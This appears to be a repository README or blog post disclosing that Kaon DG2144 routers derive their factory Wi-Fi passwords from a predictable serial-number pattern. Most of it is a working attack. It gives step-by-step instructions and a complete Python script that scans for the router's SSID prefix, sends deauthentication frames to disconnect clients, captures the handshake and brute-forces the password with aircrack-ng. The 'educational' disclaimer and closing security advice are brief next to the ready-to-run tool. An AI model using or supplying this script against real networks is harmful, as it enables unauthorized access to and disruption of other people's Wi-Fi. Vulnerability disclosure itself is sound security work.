# WIikaonWi
a script to take advantage of simple wifi credentials in the KAON DG2144 and other similar devices.
Wikaonwi: A Factory Wi-Fi Credential Vulnerability

Date: 1/21/25 9:35 PM

Wikaonwi:

In the ever-evolving landscape of cybersecurity, vulnerabilities can often be found in the most unexpected places. One such vulnerability has been identified in the Kaon DG2144 router, where the factory Wi-Fi password is not as random as one might expect. This flaw can lead to the easy recovery of a device's Wi-Fi credentials, posing a significant risk to users. In this blog post, we will explore the details of this vulnerability, how it can be exploited, and provide a proof of concept for educational purposes.
Understanding the Vulnerability

The Kaon DG2144 router has a predictable pattern in its factory-set Wi-Fi passwords. Instead of being randomly generated, the passwords are based on the device's serial number, which follows a specific format. For example, consider the following serial numbers:


        

        BS10096321004321

        BS10096123001234

        BS10096XXX00XXXX

        

    

The passwords are constructed using a fixed prefix (BS10096) followed by a combination of numbers, making them susceptible to brute-force attacks. The predictable nature of these passwords means that an attacker can easily generate all possible combinations and attempt to gain access to the Wi-Fi network.These devices also have a prefixed SSID which makes them easier to identify being DG2144-XXXX
How We Can Exploit This Vulnerability

To exploit this vulnerability, an attacker can follow these steps:

    Generate All Possible Combinations: Using the known format of the password, generate all possible combinations based on the serial number structure. The format is as follows: BS10096(000-999)00(0000-9999).
    Scan for Target Wi-Fi Networks: Identify Wi-Fi networks that start with the SSID prefix DG2144-.
    Deauthenticate Connected Clients: Use a deauthentication attack to disconnect clients from the target Wi-Fi network, forcing the router to send a handshake when clients reconnect.
    Capture the Handshake: Monitor the network to capture the handshake, which contains the necessary information to crack the password.
    Crack the Handshake: Use the generated combinations to attempt to crack the captured handshake and recover the Wi-Fi password.

Proof of Concept Code

Below is a Python script that demonstrates the steps outlined above. This script is for educational purposes only and should not be used for malicious activities.


```        
        
import subprocess
import time
import os
import re
import sys
import random

INTERFACE = "wlan0"

def check_root():
    if os.geteuid() != 0:
        print("This script must be run as root!")
        sys.exit(1)

def generate_combinations(i_range, j_range):
    """Generator that yields passwords with randomized j values for each i"""
    for i in i_range:
        # Generate all possible j values and shuffle them
        j_values = list(j_range)
        random.shuffle(j_values)
        
        for j in j_values:
            yield f"BS10096{i:03}00{j:04}"

def scan_for_wifi():
    print("[+] Scanning for Wi-Fi networks...")
    try:
        result = subprocess.run(["airodump-ng", INTERFACE],
                               capture_output=True,
                               text=True,
                               timeout=15)
        return result.stdout
    except subprocess.TimeoutExpired:
        return ""

def extract_network_info(output, target_ssid):
    pattern = re.compile(
        r'^([0-9A-Fa-f:]{17})\s+.*?\s+(\d+)\s+.*\s{}(?:\s*)$'.format(re.escape(target_ssid)),
        re.MULTILINE
    )
    return pattern.findall(output)

def deauth_clients(bssid):
    print(f"[!] Deauthenticating clients on {bssid}...")
    subprocess.run(["aireplay-ng", "--deauth", "10", "-a", bssid, INTERFACE],
                  stdout=subprocess.DEVNULL,
                  stderr=subprocess.DEVNULL)

def capture_handshake(bssid, channel):
    print(f"[+] Starting handshake capture on channel {channel}")
    filename = f"capture_{bssid.replace(':', '')}"
    proc = subprocess.Popen(["airodump-ng", "--bssid", bssid, "-c", str(channel),
                            "-w", filename, INTERFACE],
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
    return proc, filename

def crack_handshake(bssid, cap_file):
    """Crack handshake with randomized j values for each i"""
    print("[!] Starting randomized cracking process...")
    
    # Configure ranges (adjust these values as needed)
    i_range = range(0, 1000)    # 000-999 for middle numbers
    j_range = range(0, 10000)   # 0000-9999 for end numbers
    
    # Start aircrack-ng process
    cracker = subprocess.Popen(["aircrack-ng", "-b", bssid, f"{cap_file}-01.cap", "-w", "-"],
                              stdin=subprocess.PIPE,
                              text=True)
    
    try:
        # Generate and feed passwords to aircrack-ng
        for password in generate_combinations(i_range, j_range):
            cracker.stdin.write(password + "\n")
            cracker.stdin.flush()
            
    except BrokenPipeError:
        # This occurs when aircrack-ng exits after finding the key
        pass
    finally:
        cracker.stdin.close()
        cracker.wait()

def main():
    check_root()
    print("\n" + "="*50)
    print("Randomized Wi-Fi Cracking Tool")
    print("="*50 + "\n")
    
    target_ssid = "DG2144-"
    
    # Scan for target network
    scan_results = scan_for_wifi()
    networks = extract_network_info(scan_results, target_ssid)
    
    if not networks:
        print("[-] No matching networks found")
        sys.exit(1)
        
    # Select first found network
    bssid, channel = networks[0]
    print(f"[+] Target network found: {bssid} (Channel {channel})")
    
    # Start handshake capture
    capture_proc, cap_file = capture_handshake(bssid, channel)
    
    try:
        time.sleep(5)
        deauth_clients(bssid)
        print("[*] Waiting for handshake capture (30 seconds)...")
        time.sleep(30)
    finally:
        capture_proc.terminate()
        capture_proc.wait()
    
    # Start randomized cracking process
    crack_handshake(bssid, cap_file)

if __name__ == "__main__":
    main()

    
```
    

Conclusion

The vulnerability in the Kaon DG2144 router highlights the importance of strong, unpredictable passwords for network security. By understanding how such vulnerabilities can be exploited, users can take proactive measures to secure their devices. It is crucial to change factory-set passwords to unique, complex ones to mitigate the risk of unauthorized access. Always stay informed about potential vulnerabilities in your devices and take necessary precautions to protect your network.
